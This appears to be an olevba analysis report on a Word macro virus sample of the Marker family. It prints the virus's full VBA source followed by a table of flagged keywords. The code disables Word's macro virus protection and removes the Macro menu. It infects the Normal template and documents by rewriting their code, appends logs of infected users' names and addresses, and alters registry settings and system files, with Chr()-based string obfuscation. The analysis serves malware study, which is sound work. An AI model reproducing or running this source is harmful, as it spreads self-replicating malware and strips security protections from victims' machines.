olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.kc-658f0571e6301d560e5ef7da3ce89fa968876af1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.kc-658f0571e6301d560e5ef7da3ce89fa968876af1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 'Son, Be a Good Boy !
Const Marker = "<- this is a marker! by fs080298"
Private Sub Document_Open()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 1 Then
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 0
        CommandBars("Tools").Controls("Macro").Delete
    Else
        CommandBars("Tools").Controls("Macro").Delete
    End If
    Options.VirusProtection = False
    If Month(Now) = 1 And Day(Now) < 10 Then Message$ = "HAPPY NEW YEAR " & Year(Now) & " ! From : «(¤¿¤)» Me !"
        If Day(Now) = ((64 / 8) - 2 + 10 - (6 + 2)) And Month(Now) = ((30 / 6) + (4 / 2) + 4 - 5) Then Message$ = "Today Is My Birthday ! Thank's For Your Greeting..."
            If Day(Now) = ((25 / 5) - 2 + 10 + 14) And Month(Now) = (2 ^ 5) - 30 + 5 Then Message$ = "Happy Birthday Honey, I Love U So Much..."
                If Day(Now) = (3 ^ 6) - 700 + (2 ^ 3) - 22 And Month(Now) = (5 ^ 3) - 120 + 7 Then Message$ = "Happy Birthday, Son ! Be a Good Boy..."
                    If Message$ <> "" Then MsgBox Message$, vbInformation, "From : <(¤¿¤)>"
    Message$ = ""
    Document_Close
End Sub
Private Sub Document_Close()
    Dim nmod As Object
    Dim isd As String
    Dim DS, NTS, DI, NTI As Boolean
    Dim EmailMe, Users, LogData, LogFile As String
    On Error Resume Next
    If Right(Marker, 8) <> Chr(102) + Chr(115) + Chr(48) + Chr(56) + Chr(48) + Chr(50) + Chr(57) + Chr(56) Then GoTo Finish
    AddIns.Unload True
    Application.UserName = "fs080298"
    Application.UserInitials = "FS2000"
    Application.UserAddress = "fs080298@yeayea.com"
    Application.EnableCancelKey = wdCancelDisabled
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "" And Mid(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(121, 1), 33, 8) <> Chr$(70) + Chr$(83) + Chr$(48) + Chr$(56) + Chr$(48) + Chr$(50) + Chr$(57) + Chr$(56) Then GoTo Finish
    GoSub Sisipin
    If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
    "LogData in") = False) Then GoSub LoggingIn
    GoSub EmailMePlease
    GoTo Finish
    
Sisipin:
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "" And NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> Chr(32) + Chr$(39) + Chr$(83) + Chr$(111) + Chr$(110) + Chr$(44) + Chr$(32) + Chr$(66) + Chr$(101) + Chr$(32) + Chr$(97) + Chr$(32) + Chr$(71) + Chr$(111) + Chr$(111) + Chr$(100) + Chr$(32) + Chr$(66) + Chr$(111) + Chr$(121) + Chr$(32) + Chr$(33) Then Return
    DI = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NTI = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "" And Mid(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(95, 1), 119, 20) <> Chr$(32) + Chr$(169) + Chr$(32) + Chr$(72) + Chr$(97) + Chr$(118) + Chr$(101) + Chr$(32) + Chr$(97) + Chr$(32) + Chr$(78) + Chr$(105) + Chr$(99) + Chr$(101) + Chr$(32) + Chr$(68) + Chr$(97) + Chr$(121) + Chr$(32) + Chr$(33) Then Return
    If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
        If DI Then
            NTS = NormalTemplate.Saved
            EmailMe = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
        For i = 1 To Len(Application.UserAddress)
            If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
                If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
                    Users = Users & Mid(Application.UserAddress, i, 1)
                End If
            Else
                Users = Users & Chr(13) & " '"
            End If
        Next
    EmailMe = EmailMe & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString EmailMe
    If NTS Then NormalTemplate.Save
    End If
    If NTI Then
        DS = ActiveDocument.Saved
        EmailMe = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
        ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
        ad.CodeModule.AddFromString EmailMe
        If DS Then ActiveDocument.Save
        End If
    End If
    Return
    
LoggingIn:
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
    GoSub EmailMePlease
    Return

EmailMePlease:
    Dim SystemRoot As String
    On Error Resume Next
    SystemRoot = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s1159") = Chr(60) + Chr(40) + Chr(164) + Chr(191) + Chr(164) + Chr(41) + Chr(62)
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "sTimeFormat") = "HH:mm:ss tt"
                System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductName") = "FS080298"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "FaN's Comp. 2000"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Hi ! <(¤¿¤)> It's Me !"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductId") = "Feb 8, 1998 -> Dec 15, 1998"
    Open SystemRoot & "\EmailMe.html" For Output As #1
        Print #1, "<html><head><title>Email Me !</title></head><body bgcolor='#000000' link='#FFFF00' vlink='#00FFFF'>"
        Print #1, "<p align='right'><font color='#80FF00' size='3' face='Arial'><marquee scrollamount='3' width='53%'> © Have a Nice Day ! - Don't Forget to Save Your Data...</marquee></font></p>"
        Print #1, "<h6 align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
        Print #1, "<p align='center'><font color='#FF80FF' size='7'><marquee behavior='alternate' width='11%'>ÒÓ</marquee></font>"
        Print #1, "<p align='center'><font color='#FF80FF' size='7'><strong>¯</strong></font></p>"
        Print #1, "<p align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
        Print #1, "<p><br><br><br><br><br></p>"
        Print #1, "<p align='right'><a href='mailto:fs080298@yeayea.com'><font size='2'>Email Me !</font></a></p></Body></html>"
        Print #1, "<Script Language='VBS'>"
        Print #1, "Sub button1_onClick()"
        Print #1, "alert " + Chr(34) + "I Said : Don`t Press Me ! Can`t You Read ?" + Chr(34)
        Print #1, "End Sub"
        Print #1, "</script>"
        Print #1, "<p align='right'><INPUT TYPE='BUTTON' NAME='Button1' VALUE='Don`t Press Me !'></p>"
    Close #1
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = SystemRoot & "\EmailMe.html"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s2359") = Chr(60) + Chr(40) + Chr(169) + Chr(191) + Chr(169) + Chr(41) + Chr(62)
        If System.Version = 4.1 Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = Chr(72) + Chr(105) + Chr(32) + Chr(33) + Chr(32) + Chr(72) + Chr(111) + Chr(119) + Chr(32) + Chr(65) + Chr(114) + Chr(101) + Chr(32) + Chr(89) + Chr(111) + Chr(117) + Chr(32) + Chr(84) + Chr(111) + Chr(100) + Chr(97) + Chr(121) + Chr(46) + Chr(46) + Chr(46)
            System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "InfoTip") = "Hi ! «(¤¿¤)» Have a Nice Day..."
        Else
            System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = Chr(72) + Chr(105) + Chr(32) + Chr(33) + Chr(32) + Chr(72) + Chr(111) + Chr(119) + Chr(32) + Chr(65) + Chr(114) + Chr(101) + Chr(32) + Chr(89) + Chr(111) + Chr(117) + Chr(32) + Chr(84) + Chr(111) + Chr(100) + Chr(97) + Chr(121) + Chr(46) + Chr(46) + Chr(46)
        End If
    myoem = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot") + Chr(92) + Chr(83) + Chr(121) + Chr(115) + Chr(116) + Chr(101) + Chr(109)
    myini$ = Chr(92) + Chr(79) + Chr(101) + Chr(109) + Chr(105) + Chr(110) + Chr(102) + Chr(111) + Chr(46) + Chr(105) + Chr(110) + Chr(105)
    Open myoem & myini$ For Output As #2
        Print #2, "[general]"
        Print #2, "Manufacturer=FS080298 CORP. 98"
        Print #2, "Model=Son, I Love You So Much !"
        Print #2, ""
        Print #2, "[Support Information]"
        Print #2, "Line1=THank`s For Looking My Wallpaper (Win98x Only)"
        Print #2, "Line2=My Program Is Not DANGER !"
        Print #2, "Line3=Don`t Worry !!!"
        Print #2, "Line4="
        Print #2, "Line5=Do You Have Any Comments ?"
        Print #2, "Line6=Please Send Your Email to : fs080298@yeayea.com"
        Print #2, "Line7=:-)"
    Close #2
Return
Finish:
End Sub

'THank's 4 Looking My Wallpaper (Win98x Only)
'Log File ->

' 12:24:3512:24:35 PM PM-Sunday, 16 Apr 2000
' fs080298
' fs080298@yeayea.com

 


' 10:58:4910:58:49 <(¤¿¤)> <(¤¿¤)>-Friday, 21 Apr 2000
' fs080298
' fs080298@yeayea.com

 


' 07:54:117:54:11 PM PM-Tuesday, 4 Jul 2000
' fs080298
' fs080298@yeayea.com

 


' 09:00:559:00:55 <(©¿©)> <(©¿©)>-Saturday, 5 Aug 2000
' fs080298
' fs080298@yeayea.com

 


' 01:08:181:08:18 PM PM-Wednesday, 20 Sep 2000
' fs080298
' fs080298@yeayea.com

 


' 12:44:5612:44:56 AM AM-Saturday, 23 Sep 2000
' fs080298
' fs080298@yeayea.com

 


' 12:00:2912:00:29 <(¤¿¤)> <(¤¿¤)>-Wednesday, 4 Oct 2000
' fs080298
' fs080298@yeayea.com

 


' 10:10:1410:10:14 AM AM-Thursday, 12 Oct 2000
' fs080298
' fs080298@yeayea.com

 


' 10:11:010:11:00 <(©¿©)> <(©¿©)>-Friday, 27 Oct 2000
' fs080298
' fs080298@yeayea.com

 


' 01:13:491:13:49 AM AM-Monday, 30 Oct 2000
' fs080298
' fs080298@yeayea.com

 


' 02:42:362:42:36 <(¤¿¤)> <(¤¿¤)>-Saturday, 2 Dec 2000
' fs080298
' fs080298@yeayea.com

 


' 10:51:1810:51:18 AM AM-Monday, 4 Dec 2000
' fs080298
' fs080298@yeayea.com

 


' 04:10:574:10:57 AM AM-Monday, 8 Jan 2001
' fs080298
' fs080298@yeayea.com

 


' 09:19:49:19:04 <(¤¿¤)> <(¤¿¤)>-Tuesday, 27 Mar 2001
' fs080298
' fs080298@yeayea.com

 


' 01:04:121:04:12 PM PM-Wednesday, 7 Nov 2001
' fs080298
' fs080298@yeayea.com

 


' 12:14:2812:14:28 PM PM-Thursday, 15 Nov 2001
' fs080298
' fs080298@yeayea.com

 


' 02:50:142:50:14 <(©¿©)> <(©¿©)>-Thursday, 29 Nov 2001
' fs080298
' fs080298@yeayea.com

 


' 03:53:173:53:17 <(©¿©)> <(©¿©)>-Thursday, 29 Nov 2001
' fs080298
' fs080298@yeayea.com

 


' 10:20:410:20:04 AM AM-Friday, 30 Nov 2001
' fs080298
' fs080298@yeayea.com

 


' 11:54:3111:54:31 <(¤¿¤)> <(¤¿¤)>-Thursday, 6 Dec 2001
' fs080298
' fs080298@yeayea.com

 


' 03:06:213:06:21 PM PM-Thursday, 6 Dec 2001
' fs080298
' fs080298@yeayea.com

 


' 09:54:259:54:25 AM AM-Friday, 7 Dec 2001
' fs080298
' fs080298@yeayea.com

 


' 11:53:3511:53:35  <(¤¿¤)>-Tuesday, 11 Dec 2001
' fs080298
' fs080298@yeayea.com

 


' 11:33:3611:33:36 AM AM-Wednesday, 19 Aug 1998
' fs080298
' fs080298@yeayea.com

 


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

